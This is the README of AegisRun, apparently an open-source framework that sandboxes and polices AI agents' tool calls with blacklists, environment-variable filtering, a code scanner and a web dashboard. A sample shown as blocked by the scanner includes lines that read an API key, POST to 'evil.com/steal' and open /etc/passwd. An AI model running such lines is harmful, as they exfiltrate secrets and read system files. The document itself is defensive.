# AegisRun v0.9.3

**AI Agent Secure Tool Execution Framework — MoonBit Policy Engine + Rust Sandbox Runtime**


> 🇨🇳 [中文版 →](../README.md)

[![MoonBit](https://img.shields.io/badge/MoonBit-0.1.20260703-blue)](https://moonbitlang.com)
[![Rust](https://img.shields.io/badge/Rust-wasmtime%2046-orange)](https://github.com/tuya-me/AegisRun/tree/clean-v2/runtime)
[![License](https://img.shields.io/badge/License-Apache--2.0-blue)](https://opensource.org/licenses/Apache-2.0)
[![OSC2026](https://img.shields.io/badge/OSC2026-AI%20Agent%20Track-orange)](https://moonbitlang.github.io/OSC2026/)

> MoonBit `>= 0.1.20260703` | Rust `>= 1.80` (runtime only) | wasmtime 46
> **Install:** `moon add tuya-me/aegisrun` &nbsp;|&nbsp; **Branch:** `clean-v2`

---

## Overview

AI agents can leak API keys, upload sensitive files, or scan internal networks through third-party tools. AegisRun provides a **lightweight security execution layer** with five-level defense.

- **MoonBit layer** (~3600 lines): Domain/IP blacklist, path interception, env var filtering, risk scoring, rate limiting, SQL guard
- **Rust layer** (~1800 lines): wasmtime WASI physical sandbox, runtime sandbox monitor, web dashboard, audit logging, ToolRegistry (tool discovery, registration, unregistration, tag search, keyword search, SHA256 signature verification, JSON persistence)

## Architecture

```
MoonBit Library (src/lib/)           Rust Runtime (runtime/)
┌────────────────────┐       ┌──────────────────────────────┐
│ check_domain()     │ Allow │ wasmtime WASI interceptor     │
│ check_path()       │←─────│ path_open → check_path       │
│ check_env()        │ Deny  │ environ_get → check_env      │
│                    │       │ sock_send → check_domain    │
│ Pure MoonBit logic │       │ Rust syscall interception   │
└────────────────────┘       └──────────────────────────────┘
```

## Quick Start

```cmd
cd D:\moonbit\aegisrun
scripts\quickstart.cmd              # Interactive menu
moon run src/main                 # MoonBit CLI: demo
cd runtime
cargo run -- demo                 # Rust CLI: demo
cargo run -- serve                # Web dashboard (port 9090)
```

## Documentation

| For... | Read |
|--------|------|
| **New users** | [GUIDE.md](GUIDE.md) (Beginner) |
| **Developers** | [GUIDE.md](GUIDE.md) (Detailed) |
| **Contributors** | [CONTRIBUTING.md](CONTRIBUTING.md) |
| **Security** | [SECURITY-POLICY.md](SECURITY-POLICY.md) |
| **Architecture** | [ARCHITECTURE.md](ARCHITECTURE.md) |
| **中文文档** | [README.md](../README.md) |


## Command Reference

| Command | Effect |
|---------|--------|
| `moon run src/main` | MoonBit policy engine + demo |
| `cargo run -- demo` | Rust policy engine demo |
| `cargo run -- scan malware.py` | Scan script for threats |
| `cargo run -- sandbox tool.wasm` | WASI physical isolation sandbox |
| `cargo run -- serve` | Web dashboard (port 9090) |
| `cargo run -- scan --code "..."` | Scan inline code |
| `cargo run -- audit` | Audit log (JSONL) |
| `cargo run -- verify tool.wasm id pub` | Tool signature verification |

### Web Dashboard

AegisRun provides a full-featured web management panel with bilingual UI (Chinese/English), real-time security scanning, and interactive MCP Agent tool caller.

```cmd
cd runtime && cargo run -- serve
```

Open `http://localhost:9090` in your browser. The panel is divided into three main zones:

```
┌─────────────────────────────────────────────────────────────┐
│  Web Management Zone                                         │
│  ├─ Dashboard: Defense layer toggles, stats, presets        │
│  ├─ Domain: Blacklist/whitelist management                  │
│  ├─ Path: Sensitive path interception                       │
│  ├─ Env: Sensitive environment variable patterns            │
│  ├─ Tools: Tool ID blocking + Tool Registry (register/search/tags/unregister) │
│  └─ Audit: Real-time operation logs                         │
├─────────────────────────────────────────────────────────────┤
│  Sandbox Detection Zone                                      │
│  ├─ Static Scan: Analyze source code for malicious patterns │
│  └─ Runtime Sandbox: Python audit hook interception         │
├─────────────────────────────────────────────────────────────┤
│  MCP Agent Zone                                              │
│  ├─ MCP endpoint configuration                              │
│  ├─ Available tools list (14 tools)                         │
│  └─ Interactive tool caller                                 │
└─────────────────────────────────────────────────────────────┘
```

**Defense Layers** — Five layers with individual toggles:

- **Runtime Sandbox** (Layer 1): Python audit hook monitoring
- **Domain Blacklist** (Layer 2): Exact match + suffix wildcard + IP prefix
- **Path + Env** (Layer 3): Exact match + prefix directories + KEY/SECRET/TOKEN detection
- **Scanner** (Layer 4): Static code analysis
- **Wasm Sandbox** (Layer 5): wasmtime WASI physical isolation

**Security Detection** — Two modes in the Sandbox tab:

```python
# Static scan
import os
key = os.environ.get("OPENAI_API_KEY")  # L2 [env] OPENAI_API_KEY — BLOCKED
import requests
requests.post("https://evil.com/steal")  # L4 [host] evil.com — BLOCKED
open("/etc/passwd")                      # L5 [path] /etc/passwd — BLOCKED
```

**Policy Configuration** — Three methods: presets (Standard / Strict / Permissive), manual management, real-time sync.

**API Endpoints:** `GET /api/policy` | `GET /api/stats` | `GET /api/audit` | `POST /api/scan` | `POST /api/sandbox-run` | `GET /api/tools` | `GET /api/tools/search` | `GET /api/tools/tags` | `POST /api/tools/register` | `POST /api/tools/unregister` | `POST /mcp`

### Library Usage

```moonbit
// MoonBit: moon add tuya-me/aegisrun
let aegis = @lib.AegisRun::new("standard")
aegis.check_domain("evil.com")          // → Deny
```

```rust
// Rust: cargo add aegisrun-runtime
let policy = Policy::standard();
policy.check_domain("evil.com");  // → false
```

### MCP Integration

```json
{ "mcpServers": { "aegisrun": { "url": "http://localhost:9090/mcp" } } }
```

13 tools: policy.summary / policy.check_domain / policy.check_path / policy.check_env / guard_tool_call / scan_code / scan_file / sandbox_python / sandbox_wasm / tools.list / tools.search / tools.tags / tools.get

## License

Apache License 2.0
